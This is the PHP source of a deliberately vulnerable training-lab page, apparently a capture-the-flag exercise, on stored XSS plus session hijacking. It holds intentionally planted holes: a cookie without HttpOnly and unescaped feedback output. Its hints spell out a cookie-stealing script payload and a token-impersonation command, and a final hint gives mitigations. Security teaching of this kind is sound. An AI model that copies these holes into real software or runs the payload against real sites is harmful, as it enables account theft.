<?php
$active = 'advanced-3';
require_once '../includes/db.php';
$conn = getDB();

// Simulasi session — cookie tidak HttpOnly (sengaja vulnerable)
if (!isset($_COOKIE['session_token'])) {
    // Assign sebagai guest
    setcookie('session_token', 'guest_token_' . substr(md5(uniqid()), 0, 16), 0, '/', '', false, false);
    // false,false = tidak Secure, tidak HttpOnly — vulnerable
}

$current_token = $_COOKIE['session_token'] ?? 'guest_token_unknown';
$current_user  = null;

// Cek apakah token cocok dengan akun
$stmt = $conn->prepare("SELECT username, role, secret FROM users WHERE session_token = ?");
$stmt->bind_param('s', $current_token);
$stmt->execute();
$res = $stmt->get_result();
if ($res->num_rows > 0) {
    $current_user = $res->fetch_assoc();
}

// Log stolen token (simulasi attacker endpoint)
$stolen_log = [];
if (isset($_GET['stolen'])) {
    $stolen_token = $_GET['stolen'];
    $stolen_log[] = $stolen_token;
}

// Feedback form — vulnerable stored XSS
$msg = ''; $mtype = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $title  = $_POST['title']  ?? '';
    $body   = $_POST['body']   ?? '';
    $author = $_POST['author'] ?? 'Anonymous';

    if ($title && $body) {
        $stmt2 = $conn->prepare("INSERT INTO feedback (title, body, author, approved) VALUES (?, ?, ?, TRUE)");
        $stmt2->bind_param('sss', $title, $body, $author);
        $stmt2->execute();
        $msg   = "Feedback berhasil dikirim dan langsung ditampilkan.";
        $mtype = 'ok';
    }
}

$feedbacks = [];
$res2 = $conn->query("SELECT id, title, body, author, created_at FROM feedback WHERE approved = TRUE ORDER BY id DESC");
while ($row = $res2->fetch_assoc()) $feedbacks[] = $row;

// Daftar semua token (simulasi admin panel)
$all_users = [];
$res3 = $conn->query("SELECT username, role, session_token, secret FROM users ORDER BY id");
while ($row = $res3->fetch_assoc()) $all_users[] = $row;
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Advanced 3: Session Hijacking — IDN Lab</title>
<?php include '../includes/shared_css.php'; ?>
</head>
<body>
<?php include '../includes/nav.php'; ?>

<div class="phdr">
  <div class="phdr-in">
    <div class="bc"><a href="/">Dashboard</a><span class="bc-sep">/</span><span>Advanced 3: Session Hijacking</span></div>
    <h1>XSS + Session Hijacking <span class="tag p">ADVANCED 3</span></h1>
    <p class="phdr-desc">Cookie session tidak diset dengan flag <code class="ic">HttpOnly</code>, membuatnya dapat dibaca oleh JavaScript. Kombinasikan Stored XSS dengan eksfiltrasi cookie untuk mengambil alih akun.</p>
  </div>
</div>

<div class="wrap">

  <div class="box">
    <div class="box-t">Objectives</div>
    <ul class="obj-list">
      <li><div class="obj-n">1</div><span>Periksa cookie browser dan konfirmasi bahwa <code class="ic">HttpOnly</code> flag tidak diset</span></li>
      <li><div class="obj-n">2</div><span>Sisipkan payload Stored XSS yang mengirimkan <code class="ic">document.cookie</code> ke endpoint attacker</span></li>
      <li><div class="obj-n">3</div><span>Salin session token milik admin dari tabel referensi, lalu set secara manual di browser</span></li>
      <li><div class="obj-n">4</div><span>Refresh halaman dan verifikasi bahwa kamu kini terautentikasi sebagai admin</span></li>
    </ul>
  </div>

  <!-- Session Status -->
  <div class="box">
    <div class="box-t">Session Status</div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
      <div style="background:var(--el);border:1px solid var(--bd);border-radius:var(--r);padding:14px 16px">
        <div style="font-size:.64rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--t3);font-family:var(--mono);margin-bottom:8px">Current Session</div>
        <div style="font-size:.78rem;font-family:var(--mono);color:<?= $current_user ? 'var(--green)' : 'var(--orange)' ?>;word-break:break-all"><?= htmlspecialchars($current_token, ENT_QUOTES, 'UTF-8') ?></div>
        <div style="margin-top:8px;font-size:.78rem;color:var(--t2)">
          Status: <strong style="color:<?= $current_user ? 'var(--green)' : 'var(--orange)' ?>"><?= $current_user ? 'Authenticated as ' . htmlspecialchars($current_user['username'], ENT_QUOTES, 'UTF-8') . ' (' . $current_user['role'] . ')' : 'Guest / Unauthenticated' ?></strong>
        </div>
      </div>
      <div style="background:var(--el);border:1px solid var(--bd);border-radius:var(--r);padding:14px 16px">
        <div style="font-size:.64rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--t3);font-family:var(--mono);margin-bottom:8px">Cookie Flags</div>
        <div style="display:flex;flex-direction:column;gap:5px">
          <div style="display:flex;align-items:center;gap:8px;font-size:.8rem">
            <span style="width:8px;height:8px;border-radius:50%;background:var(--red);flex-shrink:0"></span>
            <code class="ic">HttpOnly</code> <span style="color:var(--red)">TIDAK DISET &mdash; readable by JS</span>
          </div>
          <div style="display:flex;align-items:center;gap:8px;font-size:.8rem">
            <span style="width:8px;height:8px;border-radius:50%;background:var(--red);flex-shrink:0"></span>
            <code class="ic">Secure</code> <span style="color:var(--red)">TIDAK DISET &mdash; sent over HTTP</span>
          </div>
          <div style="display:flex;align-items:center;gap:8px;font-size:.8rem">
            <span style="width:8px;height:8px;border-radius:50%;background:var(--orange);flex-shrink:0"></span>
            <code class="ic">SameSite</code> <span style="color:var(--orange)">TIDAK DISET</span>
          </div>
        </div>
      </div>
    </div>
    <?php if ($current_user && $current_user['role'] === 'admin'): ?>
    <div class="alert a-ok" style="margin-top:12px;margin-bottom:0"><strong>Akun admin berhasil diambil alih!</strong> FLAG: <code class="ic" style="color:var(--green)"><?= htmlspecialchars($current_user['secret'], ENT_QUOTES, 'UTF-8') ?></code></div>
    <?php endif; ?>
  </div>

  <!-- Stolen token log -->
  <?php if (!empty($_GET['stolen'])): ?>
  <div class="alert a-err">
    <strong>Token berhasil diekstrak via XSS:</strong><br>
    <code class="ic" style="font-size:.82rem;word-break:break-all"><?= htmlspecialchars($_GET['stolen'], ENT_QUOTES, 'UTF-8') ?></code>
  </div>
  <?php endif; ?>

  <!-- Feedback board = Stored XSS target -->
  <div class="box">
    <div class="box-t">Feedback Board <span style="font-size:.68rem;font-weight:400;color:var(--t3)">(Stored XSS — payload dieksekusi saat admin membuka halaman)</span></div>
    <?php if($msg): ?><div class="alert a-<?= $mtype ?>"><?= htmlspecialchars($msg, ENT_QUOTES, 'UTF-8') ?></div><?php endif; ?>
    <form method="POST" action="/advanced-3/">
      <div class="fg">
        <label class="fl">Judul</label>
        <input class="fi" type="text" name="title" placeholder="Judul feedback">
      </div>
      <div class="fg">
        <label class="fl">Isi Feedback <span style="color:var(--red);font-size:.65rem">(VULNERABLE)</span></label>
        <textarea class="fi" name="body" rows="3" placeholder="Isi feedback atau XSS payload..."></textarea>
      </div>
      <div class="fg" style="margin-bottom:0">
        <label class="fl">Nama</label>
        <input class="fi" type="text" name="author" placeholder="Nama kamu">
      </div>
      <div style="margin-top:14px">
        <button type="submit" class="btn btn-r">Kirim Feedback</button>
      </div>
    </form>
  </div>

  <?php if (!empty($feedbacks)): ?>
  <div class="box">
    <div class="box-t">Feedback Tersimpan &mdash; <?= count($feedbacks) ?> post(s)</div>
    <?php foreach ($feedbacks as $fb): ?>
    <div class="comment-card">
      <div class="comment-author">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
        <?= htmlspecialchars($fb['author'], ENT_QUOTES, 'UTF-8') ?> &mdash; <?= htmlspecialchars($fb['title'], ENT_QUOTES, 'UTF-8') ?>
        <span style="color:var(--t3);font-weight:400">&mdash; <?= $fb['created_at'] ?></span>
      </div>
      <!-- VULNERABLE: body tidak di-escape -->
      <div class="comment-body"><?= $fb['body'] ?></div>
    </div>
    <?php endforeach; ?>
  </div>
  <?php endif; ?>

  <!-- Token reference -->
  <div class="box">
    <div class="box-t">Session Token Reference <span style="font-size:.68rem;font-weight:400;color:var(--t3)">(simulasi data yang bisa dicuri via XSS)</span></div>
    <div class="tbl-wrap">
      <table class="tbl">
        <thead><tr><th>Username</th><th>Role</th><th>Session Token</th><th>Flag</th></tr></thead>
        <tbody>
          <?php foreach ($all_users as $u): ?>
          <tr>
            <td><?= htmlspecialchars($u['username'], ENT_QUOTES, 'UTF-8') ?></td>
            <td><?= htmlspecialchars($u['role'], ENT_QUOTES, 'UTF-8') ?></td>
            <td><code style="font-family:var(--mono);font-size:.75rem;color:var(--orange)"><?= htmlspecialchars($u['session_token'], ENT_QUOTES, 'UTF-8') ?></code></td>
            <td style="color:var(--green);font-size:.75rem"><?= htmlspecialchars($u['secret'], ENT_QUOTES, 'UTF-8') ?></td>
          </tr>
          <?php endforeach; ?>
        </tbody>
      </table>
    </div>
  </div>

  <div class="box">
    <div class="box-t">Hints</div>

    <details class="hint">
      <summary>Hint 1 &mdash; Verifikasi cookie via console</summary>
      <div class="hint-body">
        Buka Developer Tools (F12) &rarr; Console, ketik:<br>
        <code class="ic">document.cookie</code><br>
        Kamu akan melihat <code class="ic">session_token</code> karena HttpOnly tidak diset.
      </div>
    </details>

    <details class="hint">
      <summary>Hint 2 &mdash; Payload exfiltration via Stored XSS</summary>
      <div class="hint-body">
        Kirim feedback dengan payload:<br>
        <code class="ic">&lt;script&gt;fetch('/advanced-3/?stolen='+document.cookie)&lt;/script&gt;</code><br>
        Setiap user (termasuk "admin") yang membuka halaman akan otomatis mengirimkan cookie-nya.
      </div>
    </details>

    <details class="hint">
      <summary>Hint 3 &mdash; Impersonasi admin</summary>
      <div class="hint-body">
        Salin token admin dari tabel referensi. Di browser Console, jalankan:<br>
        <code class="ic">document.cookie = "session_token=tok_admin_9f8e7d6c5b4a3210; path=/"</code><br>
        Refresh halaman — kamu sekarang terautentikasi sebagai admin.
      </div>
    </details>

    <details class="hint">
      <summary>Hint 4 &mdash; Mitigasi yang benar</summary>
      <div class="hint-body">
        Dua lapisan perlindungan yang harus diterapkan bersama-sama:<br>
        1. <strong style="color:var(--t1)">HttpOnly flag</strong> &mdash; mencegah JavaScript membaca cookie<br>
        2. <strong style="color:var(--t1)">Output encoding</strong> &mdash; mencegah XSS itu sendiri dengan <code class="ic">htmlspecialchars()</code><br>
        HttpOnly adalah <em>defense in depth</em>, bukan pengganti sanitasi input.
      </div>
    </details>
  </div>

</div>
<?php include '../includes/footer.php'; ?>
</body>
</html>
